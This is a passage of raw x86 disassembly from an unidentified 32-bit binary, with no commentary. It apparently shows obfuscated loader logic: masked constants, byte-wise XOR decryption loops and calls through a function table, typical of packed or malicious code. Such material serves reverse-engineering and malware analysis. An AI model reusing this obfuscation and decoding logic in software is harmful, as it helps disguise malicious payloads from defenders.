  426715:	and    cl,0x1f
  426718:	or     dl,0xff
  42671b:	sub    dl,cl
  42671d:	add    BYTE PTR [edi+eax*1],dl
  426720:	mov    ecx,DWORD PTR [ebp-0x18]
  426723:	xor    ecx,ebx
  426725:	lea    eax,[eax+ecx*1+0x3272f5]
  42672c:	mov    ecx,DWORD PTR [ebp-0x40]
  42672f:	cmp    eax,ecx
  426731:	jb     0x426710
  426733:	mov    eax,DWORD PTR [ebp-0x40]
  426736:	mov    DWORD PTR [ebp-0x28],eax
  426739:	mov    eax,DWORD PTR [ebp-0x24]
  42673c:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  426743:	mov    DWORD PTR [ebp-0xd4],eax
  426749:	mov    edi,0xf89c85a2
  42674e:	mov    DWORD PTR [ebp-0x2c],edi
  426751:	mov    eax,DWORD PTR [ebp-0x38]
  426754:	xor    eax,ebx
  426756:	add    eax,esi
  426758:	mov    DWORD PTR [ebp-0xc],eax
  42675b:	mov    eax,DWORD PTR [ebp-0x38]
  42675e:	xor    eax,ebx
  426760:	add    eax,esi
  426762:	mov    DWORD PTR [ebp-0x8],eax
  426765:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  42676c:	mov    DWORD PTR [ebp-0x4c],0xf89c85bc
  426773:	mov    eax,DWORD PTR [ebp-0x38]
  426776:	mov    ecx,DWORD PTR [ebp-0x28]
  426779:	xor    eax,ebx
  42677b:	add    eax,esi
  42677d:	cmp    ecx,eax
  42677f:	je     0x42697e
  426785:	jmp    0x42695a
  42678a:	mov    ecx,DWORD PTR [ebp-0xc]
  42678d:	mov    eax,DWORD PTR [ebp-0x28]
  426790:	sub    eax,ecx
  426792:	mov    ecx,DWORD PTR [ebp-0x48]
  426795:	xor    ecx,ebx
  426797:	add    ecx,esi
  426799:	xor    edx,edx
  42679b:	div    ecx
  42679d:	mov    DWORD PTR [ebp-0x8],eax
  4267a0:	mov    eax,DWORD PTR [ebp-0x4c]
  4267a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4267a6:	xor    eax,ebx
  4267a8:	add    eax,esi
  4267aa:	cmp    ecx,eax
  4267ac:	jbe    0x4267b8
  4267ae:	mov    eax,DWORD PTR [ebp-0x4c]
  4267b1:	xor    eax,ebx
  4267b3:	add    eax,esi
  4267b5:	mov    DWORD PTR [ebp-0x8],eax
  4267b8:	mov    eax,DWORD PTR [ebp-0x48]
  4267bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4267be:	xor    eax,ebx
  4267c0:	add    eax,esi
  4267c2:	imul   eax,ecx
  4267c5:	mov    DWORD PTR [ebp-0x8],eax
  4267c8:	mov    eax,DWORD PTR [ebp-0x38]
  4267cb:	mov    ecx,DWORD PTR [ebp-0x8]
  4267ce:	xor    eax,ebx
  4267d0:	add    eax,esi
  4267d2:	cmp    ecx,eax
  4267d4:	je     0x426948
  4267da:	mov    eax,DWORD PTR [ebp-0x8]
  4267dd:	mov    DWORD PTR [ebp-0x14],eax
  4267e0:	mov    eax,DWORD PTR [ebp-0xc]
  4267e3:	add    eax,DWORD PTR [ebp-0xd4]
  4267e9:	mov    DWORD PTR [ebp-0x20],0xf89c85a5
  4267f0:	mov    DWORD PTR [ebp-0x34],edi
  4267f3:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  4267fd:	mov    DWORD PTR [ebp-0x8],eax
  426800:	mov    DWORD PTR [ebp-0x30],0xf89c85a0
  426807:	mov    DWORD PTR [ebp-0x1c],edi
  42680a:	mov    eax,DWORD PTR [ebp-0x20]
  42680d:	xor    eax,ebx
  42680f:	add    eax,esi
  426811:	jmp    0x426907
  426816:	mov    DWORD PTR [ebp-0xe0],0xf89c85b8
  426820:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  42682a:	mov    eax,DWORD PTR [ebp-0x1c]
  42682d:	mov    ecx,DWORD PTR [ebp-0x44]
  426830:	xor    eax,ebx
  426832:	add    eax,esi
  426834:	imul   eax,ecx
  426837:	mov    ecx,DWORD PTR [ebp-0x8]
  42683a:	mov    al,BYTE PTR [eax+ecx*1]
  42683d:	mov    BYTE PTR [ebp-0x2],al
  426840:	mov    eax,DWORD PTR [ebp-0x1c]
  426843:	mov    ecx,DWORD PTR [ebp-0x44]
  426846:	xor    eax,ebx
  426848:	add    eax,esi
  42684a:	imul   eax,ecx
  42684d:	mov    ecx,DWORD PTR [ebp-0xe8]
  426853:	xor    ecx,ebx
  426855:	add    eax,ecx
  426857:	mov    ecx,DWORD PTR [ebp-0x8]
  42685a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426862:	mov    ecx,DWORD PTR [ebp-0xe0]
  426868:	xor    ecx,ebx
  42686a:	lea    eax,[ecx+eax*1+0x3272f5]
  426871:	movzx  ecx,BYTE PTR [ebp-0x2]
  426875:	xor    ecx,eax
  426877:	mov    BYTE PTR [ebp-0x2],cl
  42687a:	mov    al,BYTE PTR [ebp-0x2]
  42687d:	mov    ecx,DWORD PTR [ebp-0x1c]
  426880:	mov    edx,DWORD PTR [ebp-0x44]
  426883:	xor    ecx,ebx
  426885:	add    ecx,esi
  426887:	imul   ecx,edx
  42688a:	mov    edx,DWORD PTR [ebp-0x8]
  42688d:	mov    BYTE PTR [ecx+edx*1],al
  426890:	mov    eax,DWORD PTR [ebp-0x1c]
  426893:	mov    ecx,DWORD PTR [ebp-0x44]
  426896:	xor    eax,ebx
  426898:	add    eax,esi
  42689a:	imul   eax,ecx
  42689d:	mov    ecx,DWORD PTR [ebp-0x8]
  4268a0:	mov    al,BYTE PTR [eax+ecx*1]
  4268a3:	mov    BYTE PTR [ebp-0x2],al
  4268a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4268a9:	mov    ecx,DWORD PTR [ebp-0x44]
  4268ac:	xor    eax,ebx
  4268ae:	add    eax,esi
  4268b0:	imul   eax,ecx
  4268b3:	mov    ecx,DWORD PTR [ebp-0x34]
  4268b6:	xor    ecx,ebx
  4268b8:	add    eax,ecx
  4268ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4268bd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  4268c5:	mov    ecx,DWORD PTR [ebp-0xc4]
  4268cb:	xor    ecx,ebx
  4268cd:	lea    eax,[ecx+eax*1+0x3272f5]
  4268d4:	movzx  ecx,BYTE PTR [ebp-0x2]
  4268d8:	xor    ecx,eax
  4268da:	mov    BYTE PTR [ebp-0x2],cl
  4268dd:	mov    al,BYTE PTR [ebp-0x2]
  4268e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4268e3:	mov    edx,DWORD PTR [ebp-0x44]
  4268e6:	xor    ecx,ebx
  4268e8:	add    ecx,esi
  4268ea:	imul   ecx,edx
  4268ed:	mov    edx,DWORD PTR [ebp-0x8]
  4268f0:	mov    BYTE PTR [ecx+edx*1],al
  4268f3:	mov    eax,DWORD PTR [ebp-0x30]
  4268f6:	mov    ecx,DWORD PTR [ebp-0x34]
  4268f9:	xor    eax,ebx
  4268fb:	xor    ecx,ebx
  4268fd:	add    eax,esi
  4268ff:	add    ecx,esi
  426901:	imul   eax,ecx
  426904:	add    eax,DWORD PTR [ebp-0x44]
  426907:	mov    DWORD PTR [ebp-0x44],eax
  42690a:	mov    eax,DWORD PTR [ebp-0x44]
  42690d:	mov    ecx,DWORD PTR [ebp-0x14]
  426910:	cmp    ecx,eax
  426912:	jb     0x426816
  426918:	mov    eax,DWORD PTR [ebp-0x34]
  42691b:	mov    ecx,DWORD PTR [ebp-0x14]
  42691e:	xor    eax,ebx
  426920:	add    eax,esi
  426922:	imul   eax,ecx
  426925:	mov    ecx,DWORD PTR [ebp-0x20]
  426928:	xor    ecx,ebx
  42692a:	add    ecx,esi
  42692c:	or     eax,ecx
  42692e:	mov    ecx,DWORD PTR [ebp-0x2c]
  426931:	xor    ecx,ebx
  426933:	add    eax,ecx
  426935:	mov    ecx,DWORD PTR [ebp-0x2c]
  426938:	xor    ecx,ebx
  42693a:	add    eax,ecx
  42693c:	mov    ecx,DWORD PTR [ebp-0xc]
  42693f:	lea    eax,[eax+ecx*1+0x64e5ea]
  426946:	jmp    0x426957
  426948:	mov    eax,DWORD PTR [ebp-0x2c]
  42694b:	mov    ecx,DWORD PTR [ebp-0xc]
  42694e:	xor    eax,ebx
  426950:	lea    eax,[eax+ecx*1+0x3272f5]
  426957:	mov    DWORD PTR [ebp-0xc],eax
  42695a:	mov    eax,DWORD PTR [ebp-0x2c]
  42695d:	xor    eax,ebx
  42695f:	mov    ecx,0xffcd8d0b
  426964:	sub    ecx,eax
  426966:	add    ecx,DWORD PTR [ebp-0x28]
  426969:	mov    eax,DWORD PTR [ebp-0x2c]
  42696c:	mov    edx,DWORD PTR [ebp-0xc]
  42696f:	xor    eax,ebx
  426971:	add    eax,esi
  426973:	imul   eax,edx
  426976:	cmp    eax,ecx
  426978:	jbe    0x42678a
  42697e:	mov    eax,DWORD PTR [ebp-0x10]
  426981:	mov    ecx,DWORD PTR [ebp-0x40]
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	mov    edx,DWORD PTR [ebp-0x54]
  42698a:	mov    eax,DWORD PTR [eax+0x1e0]
  426990:	xor    edx,ebx
  426992:	add    edx,esi
  426994:	push   edx
  426995:	mov    edx,DWORD PTR [ebp-0x3c]
  426998:	xor    edx,ebx
  42699a:	add    edx,esi
  42699c:	push   edx
  42699d:	push   ecx
  42699e:	mov    DWORD PTR [ebp-0x30],ecx
  4269a1:	mov    ecx,DWORD PTR [ebp-0x10]
  4269a4:	xor    ecx,ebx
  4269a6:	add    ecx,esi
  4269a8:	push   ecx
  4269a9:	call   DWORD PTR [eax+0x14]
  4269ac:	mov    edi,eax
  4269ae:	mov    eax,DWORD PTR [ebp-0x10]
  4269b1:	xor    eax,ebx
  4269b3:	add    eax,esi
  4269b5:	cmp    eax,edi
  4269b7:	je     0x426a12
  4269b9:	mov    eax,DWORD PTR [ebp-0x10]
  4269bc:	jmp    0x4269df
  4269be:	mov    ecx,DWORD PTR [ebp-0x24]
  4269c1:	xor    eax,ebx
  4269c3:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f5]
  4269ca:	mov    BYTE PTR [eax+edi*1+0x3272f5],cl
  4269d1:	mov    ecx,DWORD PTR [ebp-0x18]
  4269d4:	xor    ecx,ebx
  4269d6:	lea    eax,[ecx+eax*1+0x3272f5]
  4269dd:	xor    eax,ebx
  4269df:	mov    ecx,DWORD PTR [ebp-0x40]
  4269e2:	sub    ecx,esi
  4269e4:	xor    ecx,ebx
  4269e6:	cmp    eax,ecx
  4269e8:	jne    0x4269be
  4269ea:	mov    eax,DWORD PTR [ebp+0x8]
  4269ed:	mov    ecx,DWORD PTR [ebp-0x50]
  4269f0:	mov    eax,DWORD PTR [eax+0x1e0]
  4269f6:	xor    ecx,ebx
  4269f8:	add    ecx,esi
  4269fa:	push   ecx
  4269fb:	mov    ecx,DWORD PTR [ebp-0x10]
  4269fe:	xor    ecx,ebx
  426a00:	add    ecx,esi
  426a02:	push   ecx
  426a03:	push   DWORD PTR [ebp-0x24]
  426a06:	call   DWORD PTR [eax+0x18]
  426a09:	mov    eax,DWORD PTR [ebp-0x30]
  426a0c:	mov    DWORD PTR [ebp-0x24],edi
  426a0f:	mov    DWORD PTR [ebp-0x40],eax
  426a12:	mov    edi,DWORD PTR [ebp-0x24]
  426a15:	mov    eax,DWORD PTR [ebp-0x18]
  426a18:	mov    ecx,DWORD PTR [ebp-0x10]
  426a1b:	xor    eax,ebx
  426a1d:	mov    DWORD PTR [ebp-0x30],edi
  426a20:	add    eax,esi
  426a22:	mov    DWORD PTR [ebp-0x5c],0x402b332b
  426a29:	mov    DWORD PTR [ebp-0x58],0x362b3e2b
  426a30:	jmp    0x426a64
  426a32:	xor    ecx,ebx
  426a34:	mov    dl,BYTE PTR [ebp+ecx*1+0x327299]
  426a3b:	xor    dl,0x7e
  426a3e:	add    dl,0x3
  426a41:	mov    DWORD PTR [ebp-0x3c],ecx
  426a44:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f5]
  426a4c:	movzx  edx,dl
  426a4f:	cmp    ecx,edx
  426a51:	jne    0x426a6e
  426a53:	mov    ecx,DWORD PTR [ebp-0x18]
  426a56:	mov    edx,DWORD PTR [ebp-0x3c]
  426a59:	xor    ecx,ebx
  426a5b:	lea    ecx,[ecx+edx*1+0x3272f5]
  426a62:	xor    ecx,ebx
  426a64:	cmp    ecx,0xf89c85bd
  426a6a:	jne    0x426a32
  426a6c:	jmp    0x426a75
  426a6e:	mov    eax,DWORD PTR [ebp-0x10]
  426a71:	xor    eax,ebx
  426a73:	add    eax,esi
  426a75:	mov    ecx,DWORD PTR [ebp-0x10]
  426a78:	xor    ecx,ebx
  426a7a:	add    ecx,esi
  426a7c:	cmp    ecx,eax
  426a7e:	je     0x426bf1
  426a84:	mov    eax,DWORD PTR [edi+0x8]
  426a87:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426a8e:	mov    DWORD PTR [ebp-0x3c],0xf89cc3d4
  426a95:	mov    DWORD PTR [ebp-0x48],0xf89cb5a5
  426a9c:	mov    DWORD PTR [ebp-0x20],0xf89c85a1
  426aa3:	mov    DWORD PTR [ebp-0x14],eax
  426aa6:	mov    eax,DWORD PTR [ebp+0x8]
  426aa9:	mov    ecx,DWORD PTR [ebp-0x20]
  426aac:	xor    ecx,ebx
  426aae:	add    ecx,esi
  426ab0:	push   ecx
  426ab1:	mov    ecx,DWORD PTR [ebp-0x48]
  426ab4:	mov    eax,DWORD PTR [eax+0x1e0]
  426aba:	xor    ecx,ebx
  426abc:	add    ecx,esi
  426abe:	push   ecx
  426abf:	mov    ecx,DWORD PTR [ebp-0x3c]
  426ac2:	xor    ecx,ebx
  426ac4:	add    ecx,esi
  426ac6:	push   ecx
  426ac7:	mov    ecx,DWORD PTR [ebp-0xc]
  426aca:	xor    ecx,ebx
  426acc:	add    ecx,esi
  426ace:	push   ecx
  426acf:	call   DWORD PTR [eax+0x14]
  426ad2:	mov    edi,eax
  426ad4:	mov    eax,DWORD PTR [ebp+0x8]
  426ad7:	mov    ecx,DWORD PTR [ebp-0x20]
  426ada:	mov    eax,DWORD PTR [eax+0x1e0]
  426ae0:	xor    ecx,ebx
  426ae2:	add    ecx,esi
  426ae4:	push   ecx
  426ae5:	mov    ecx,DWORD PTR [ebp-0x48]
  426ae8:	xor    ecx,ebx
  426aea:	add    ecx,esi
  426aec:	push   ecx
  426aed:	mov    ecx,DWORD PTR [ebp-0xc]
  426af0:	push   DWORD PTR [ebp-0x14]
  426af3:	xor    ecx,ebx
  426af5:	add    ecx,esi
  426af7:	push   ecx
  426af8:	call   DWORD PTR [eax+0x14]
  426afb:	mov    ecx,DWORD PTR [ebp-0xc]
  426afe:	xor    ecx,ebx
  426b00:	add    ecx,esi
  426b02:	mov    DWORD PTR [ebp-0x20],eax
  426b05:	cmp    ecx,edi
  426b07:	je     0x426e94
  426b0d:	mov    ecx,DWORD PTR [ebp-0xc]
  426b10:	xor    ecx,ebx
  426b12:	add    ecx,esi
  426b14:	cmp    ecx,eax
  426b16:	je     0x426e94
  426b1c:	mov    DWORD PTR [ebp-0x3c],0xf89c85a0
  426b23:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  426b2a:	mov    ecx,DWORD PTR [ebp-0x3c]
  426b2d:	xor    cl,0xae
  426b30:	sub    cl,0xb
  426b33:	mov    BYTE PTR [edi],cl
  426b35:	mov    ecx,DWORD PTR [ebp-0xc]
  426b38:	xor    cl,0xae
  426b3b:	sub    cl,0xb
  426b3e:	mov    BYTE PTR [edi+0x1],cl
  426b41:	mov    ecx,DWORD PTR [ebp-0x54]
  426b44:	xor    cl,0xae
  426b47:	sub    cl,0xb
  426b4a:	mov    BYTE PTR [edi+0x2],cl
  426b4d:	and    DWORD PTR [ebp-0xc8],0x0
  426b54:	and    DWORD PTR [ebp-0xdc],0x0
  426b5b:	lea    ecx,[ebp-0xdc]
  426b61:	push   ecx
  426b62:	push   DWORD PTR [ebp-0x14]
  426b65:	push   eax
  426b66:	lea    eax,[ebp-0xc8]
  426b6c:	push   eax
  426b6d:	mov    eax,DWORD PTR [ebp-0x30]
  426b70:	push   DWORD PTR [eax+0xc]
  426b73:	mov    eax,DWORD PTR [ebp-0x24]
  426b76:	add    eax,0x10
  426b79:	push   eax
  426b7a:	push   edi
  426b7b:	call   0x425e21
  426b80:	mov    DWORD PTR [ebp-0x3c],eax
  426b83:	mov    eax,DWORD PTR [ebp+0x8]
  426b86:	mov    ecx,DWORD PTR [ebp-0x50]
  426b89:	mov    eax,DWORD PTR [eax+0x1e0]
  426b8f:	xor    ecx,ebx
  426b91:	add    ecx,esi
  426b93:	push   ecx
  426b94:	mov    ecx,DWORD PTR [ebp-0xc]
  426b97:	xor    ecx,ebx
  426b99:	add    ecx,esi
  426b9b:	push   ecx
  426b9c:	push   edi
  426b9d:	call   DWORD PTR [eax+0x18]
  426ba0:	mov    eax,DWORD PTR [ebp-0x3c]
  426ba3:	add    eax,0xffcd8d0b
  426ba8:	xor    eax,ebx
  426baa:	cmp    eax,0xf89c85a5
  426baf:	mov    eax,DWORD PTR [ebp+0x8]
  426bb2:	mov    eax,DWORD PTR [eax+0x1e0]
  426bb8:	mov    ecx,DWORD PTR [ebp-0x50]
  426bbb:	jne    0x426bde
  426bbd:	xor    ecx,ebx
  426bbf:	add    ecx,esi
  426bc1:	push   ecx
  426bc2:	mov    ecx,DWORD PTR [ebp-0xc]
  426bc5:	xor    ecx,ebx
  426bc7:	add    ecx,esi
  426bc9:	push   ecx
  426bca:	push   DWORD PTR [ebp-0x24]
  426bcd:	call   DWORD PTR [eax+0x18]
  426bd0:	mov    eax,DWORD PTR [ebp-0x20]
  426bd3:	mov    DWORD PTR [ebp-0x24],eax
  426bd6:	mov    eax,DWORD PTR [ebp-0x14]
  426bd9:	mov    DWORD PTR [ebp-0x40],eax
  426bdc:	jmp    0x426bf1
  426bde:	xor    ecx,ebx
  426be0:	add    ecx,esi
  426be2:	push   ecx
  426be3:	mov    ecx,DWORD PTR [ebp-0xc]
  426be6:	xor    ecx,ebx
  426be8:	add    ecx,esi
  426bea:	push   ecx
  426beb:	push   DWORD PTR [ebp-0x20]
  426bee:	call   DWORD PTR [eax+0x18]
  426bf1:	mov    eax,DWORD PTR [ebp-0x40]
  426bf4:	mov    DWORD PTR [ebp-0x38],eax
  426bf7:	mov    eax,DWORD PTR [ebp-0x24]
  426bfa:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  426c01:	mov    DWORD PTR [ebp-0x3c],eax
  426c04:	mov    edi,0xf89c85a2
  426c09:	mov    DWORD PTR [ebp-0x2c],edi
  426c0c:	mov    eax,DWORD PTR [ebp-0x28]
  426c0f:	xor    eax,ebx
  426c11:	add    eax,esi
  426c13:	mov    DWORD PTR [ebp-0xc],eax
  426c16:	mov    eax,DWORD PTR [ebp-0x28]
  426c19:	xor    eax,ebx
  426c1b:	add    eax,esi
  426c1d:	mov    DWORD PTR [ebp-0x14],eax
  426c20:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  426c27:	mov    DWORD PTR [ebp-0x20],0xf89c85bc
  426c2e:	mov    eax,DWORD PTR [ebp-0x28]
  426c31:	mov    ecx,DWORD PTR [ebp-0x38]
  426c34:	xor    eax,ebx
  426c36:	add    eax,esi
  426c38:	cmp    ecx,eax
  426c3a:	je     0x426e30
  426c40:	jmp    0x426e0c
  426c45:	mov    ecx,DWORD PTR [ebp-0xc]
  426c48:	mov    eax,DWORD PTR [ebp-0x38]
  426c4b:	sub    eax,ecx
  426c4d:	mov    ecx,DWORD PTR [ebp-0x48]
  426c50:	xor    ecx,ebx
  426c52:	add    ecx,esi
  426c54:	xor    edx,edx
  426c56:	div    ecx
  426c58:	mov    DWORD PTR [ebp-0x14],eax
  426c5b:	mov    eax,DWORD PTR [ebp-0x20]
  426c5e:	mov    ecx,DWORD PTR [ebp-0x14]
  426c61:	xor    eax,ebx
  426c63:	add    eax,esi
  426c65:	cmp    ecx,eax
  426c67:	jbe    0x426c73
  426c69:	mov    eax,DWORD PTR [ebp-0x20]
  426c6c:	xor    eax,ebx
  426c6e:	add    eax,esi
  426c70:	mov    DWORD PTR [ebp-0x14],eax
  426c73:	mov    eax,DWORD PTR [ebp-0x48]
  426c76:	mov    ecx,DWORD PTR [ebp-0x14]
  426c79:	xor    eax,ebx
  426c7b:	add    eax,esi
  426c7d:	imul   eax,ecx
  426c80:	mov    DWORD PTR [ebp-0x14],eax
  426c83:	mov    eax,DWORD PTR [ebp-0x28]
  426c86:	mov    ecx,DWORD PTR [ebp-0x14]
  426c89:	xor    eax,ebx
  426c8b:	add    eax,esi
  426c8d:	cmp    ecx,eax
  426c8f:	je     0x426dfa
  426c95:	mov    eax,DWORD PTR [ebp-0x14]
  426c98:	mov    DWORD PTR [ebp-0x34],eax
  426c9b:	mov    eax,DWORD PTR [ebp-0xc]
  426c9e:	add    eax,DWORD PTR [ebp-0x3c]
  426ca1:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  426ca8:	mov    DWORD PTR [ebp-0x14],edi
  426cab:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  426cb2:	mov    DWORD PTR [ebp-0x1c],eax
  426cb5:	mov    DWORD PTR [ebp-0x30],0xf89c85a0
  426cbc:	mov    DWORD PTR [ebp-0x8],edi
  426cbf:	mov    eax,DWORD PTR [ebp-0x4c]
  426cc2:	xor    eax,ebx
  426cc4:	add    eax,esi
  426cc6:	jmp    0x426db9
  426ccb:	mov    DWORD PTR [ebp-0xe4],0xf89c85b8
  426cd5:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  426cdf:	mov    eax,DWORD PTR [ebp-0x8]
  426ce2:	mov    ecx,DWORD PTR [ebp-0x18]
  426ce5:	xor    eax,ebx
  426ce7:	add    eax,esi
  426ce9:	imul   eax,ecx
  426cec:	mov    ecx,DWORD PTR [ebp-0x1c]
  426cef:	mov    al,BYTE PTR [eax+ecx*1]
  426cf2:	mov    BYTE PTR [ebp-0x1],al
  426cf5:	mov    eax,DWORD PTR [ebp-0x8]
  426cf8:	mov    ecx,DWORD PTR [ebp-0x18]
  426cfb:	xor    eax,ebx
  426cfd:	add    eax,esi
  426cff:	imul   eax,ecx
  426d02:	mov    ecx,DWORD PTR [ebp-0x54]
  426d05:	xor    ecx,ebx
  426d07:	add    eax,ecx
  426d09:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d0c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426d14:	mov    ecx,DWORD PTR [ebp-0xe4]
  426d1a:	xor    ecx,ebx
  426d1c:	lea    eax,[ecx+eax*1+0x3272f5]
  426d23:	movzx  ecx,BYTE PTR [ebp-0x1]
  426d27:	xor    ecx,eax
  426d29:	mov    BYTE PTR [ebp-0x1],cl
  426d2c:	mov    al,BYTE PTR [ebp-0x1]
  426d2f:	mov    ecx,DWORD PTR [ebp-0x8]
  426d32:	mov    edx,DWORD PTR [ebp-0x18]
  426d35:	xor    ecx,ebx
  426d37:	add    ecx,esi
  426d39:	imul   ecx,edx
  426d3c:	mov    edx,DWORD PTR [ebp-0x1c]
  426d3f:	mov    BYTE PTR [ecx+edx*1],al
  426d42:	mov    eax,DWORD PTR [ebp-0x8]
  426d45:	mov    ecx,DWORD PTR [ebp-0x18]
  426d48:	xor    eax,ebx
  426d4a:	add    eax,esi
  426d4c:	imul   eax,ecx
  426d4f:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d52:	mov    al,BYTE PTR [eax+ecx*1]
  426d55:	mov    BYTE PTR [ebp-0x1],al
  426d58:	mov    eax,DWORD PTR [ebp-0x8]
  426d5b:	mov    ecx,DWORD PTR [ebp-0x18]
  426d5e:	xor    eax,ebx
  426d60:	add    eax,esi
  426d62:	imul   eax,ecx
  426d65:	mov    ecx,DWORD PTR [ebp-0x14]
  426d68:	xor    ecx,ebx
  426d6a:	add    eax,ecx
  426d6c:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d6f:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426d77:	mov    ecx,DWORD PTR [ebp-0xd0]
  426d7d:	xor    ecx,ebx
  426d7f:	lea    eax,[ecx+eax*1+0x3272f5]
  426d86:	movzx  ecx,BYTE PTR [ebp-0x1]
  426d8a:	xor    ecx,eax
  426d8c:	mov    BYTE PTR [ebp-0x1],cl
  426d8f:	mov    al,BYTE PTR [ebp-0x1]
  426d92:	mov    ecx,DWORD PTR [ebp-0x8]
  426d95:	mov    edx,DWORD PTR [ebp-0x18]
  426d98:	xor    ecx,ebx
  426d9a:	add    ecx,esi
  426d9c:	imul   ecx,edx
  426d9f:	mov    edx,DWORD PTR [ebp-0x1c]
  426da2:	mov    BYTE PTR [ecx+edx*1],al
  426da5:	mov    eax,DWORD PTR [ebp-0x30]
  426da8:	mov    ecx,DWORD PTR [ebp-0x14]
  426dab:	xor    eax,ebx
  426dad:	xor    ecx,ebx
  426daf:	add    eax,esi
  426db1:	add    ecx,esi
  426db3:	imul   eax,ecx
  426db6:	add    eax,DWORD PTR [ebp-0x18]
  426db9:	mov    DWORD PTR [ebp-0x18],eax
  426dbc:	mov    eax,DWORD PTR [ebp-0x18]
  426dbf:	mov    ecx,DWORD PTR [ebp-0x34]
  426dc2:	cmp    ecx,eax
  426dc4:	jb     0x426ccb
  426dca:	mov    eax,DWORD PTR [ebp-0x14]
  426dcd:	mov    ecx,DWORD PTR [ebp-0x34]
  426dd0:	xor    eax,ebx
  426dd2:	add    eax,esi
  426dd4:	imul   eax,ecx
  426dd7:	mov    ecx,DWORD PTR [ebp-0x4c]
  426dda:	xor    ecx,ebx
  426ddc:	add    ecx,esi
  426dde:	or     eax,ecx
  426de0:	mov    ecx,DWORD PTR [ebp-0x2c]
  426de3:	xor    ecx,ebx
  426de5:	add    eax,ecx
  426de7:	mov    ecx,DWORD PTR [ebp-0x2c]
  426dea:	xor    ecx,ebx
  426dec:	add    eax,ecx
  426dee:	mov    ecx,DWORD PTR [ebp-0xc]
  426df1:	lea    eax,[eax+ecx*1+0x64e5ea]
  426df8:	jmp    0x426e09
  426dfa:	mov    eax,DWORD PTR [ebp-0x2c]
  426dfd:	mov    ecx,DWORD PTR [ebp-0xc]
  426e00:	xor    eax,ebx
  426e02:	lea    eax,[eax+ecx*1+0x3272f5]
  426e09:	mov    DWORD PTR [ebp-0xc],eax
  426e0c:	mov    eax,DWORD PTR [ebp-0x2c]
  426e0f:	xor    eax,ebx
  426e11:	mov    ecx,0xffcd8d0b
  426e16:	sub    ecx,eax
  426e18:	add    ecx,DWORD PTR [ebp-0x38]
  426e1b:	mov    eax,DWORD PTR [ebp-0x2c]
  426e1e:	mov    edx,DWORD PTR [ebp-0xc]
  426e21:	xor    eax,ebx
  426e23:	add    eax,esi
  426e25:	imul   eax,edx
  426e28:	cmp    eax,ecx
  426e2a:	jbe    0x426c45
  426e30:	push   DWORD PTR [ebp+0x8]
  426e33:	mov    eax,DWORD PTR [ebp+0x8]
  426e36:	push   DWORD PTR [eax+0x1cc]
  426e3c:	lea    eax,[ebp-0xd8]
  426e42:	push   eax
  426e43:	mov    eax,DWORD PTR [ebp+0x8]
  426e46:	mov    eax,DWORD PTR [eax+0x1c4]
  426e4c:	push   DWORD PTR [eax]
  426e4e:	mov    eax,DWORD PTR [ebp+0x8]
  426e51:	mov    eax,DWORD PTR [eax+0x1c0]
  426e57:	push   DWORD PTR [eax]
  426e59:	push   DWORD PTR [ebp-0x40]
  426e5c:	push   DWORD PTR [ebp-0x24]
  426e5f:	call   0x4278f6
  426e64:	mov    DWORD PTR [ebp-0x3c],eax
  426e67:	mov    eax,DWORD PTR [ebp-0x10]
  426e6a:	mov    ecx,DWORD PTR [ebp-0x24]
  426e6d:	xor    eax,ebx
  426e6f:	add    eax,esi
  426e71:	cmp    eax,ecx
  426e73:	je     0x426e94
  426e75:	mov    eax,DWORD PTR [ebp+0x8]
  426e78:	mov    ecx,DWORD PTR [ebp-0x50]
  426e7b:	mov    eax,DWORD PTR [eax+0x1e0]
  426e81:	xor    ecx,ebx
  426e83:	add    ecx,esi
  426e85:	push   ecx
  426e86:	mov    ecx,DWORD PTR [ebp-0x10]
  426e89:	xor    ecx,ebx
  426e8b:	add    ecx,esi
  426e8d:	push   ecx
  426e8e:	push   DWORD PTR [ebp-0x24]
  426e91:	call   DWORD PTR [eax+0x18]
  426e94:	pop    edi
  426e95:	pop    esi
  426e96:	pop    ebx
  426e97:	leave  
  426e98:	ret    0x4
  426e9b:	push   ebp
  426e9c:	mov    ebp,esp
  426e9e:	push   ecx
  426e9f:	push   ecx
  426ea0:	lea    eax,[ebp-0x8]
  426ea3:	mov    DWORD PTR [ebp-0x4],eax
  426ea6:	push   esi
  426ea7:	mov    esi,DWORD PTR [ebp-0x4]
  426eaa:	mov    eax,0xf881ba2f
  426eaf:	mov    DWORD PTR [esi],eax
  426eb1:	mov    esi,DWORD PTR [ebp-0x8]
  426eb4:	cmp    esi,eax
  426eb6:	pop    esi
  426eb7:	jne    0x426ec1
  426eb9:	mov    BYTE PTR [ecx+0xa],0x83
  426ebd:	mov    BYTE PTR [edx+0x8],0x2e
  426ec1:	mov    BYTE PTR [edx+0xa],0x83
  426ec5:	mov    BYTE PTR [ecx+0x2],0x15
  426ec9:	leave  
  426eca:	ret    
  426ecb:	push   ebp
  426ecc:	mov    ebp,esp
  426ece:	push   ecx
  426ecf:	push   ecx
  426ed0:	lea    eax,[ebp-0x8]
  426ed3:	mov    DWORD PTR [ebp-0x4],eax
  426ed6:	mov    edx,DWORD PTR [ebp-0x4]
  426ed9:	mov    eax,0xf88b0bcb
  426ede:	mov    DWORD PTR [edx],eax
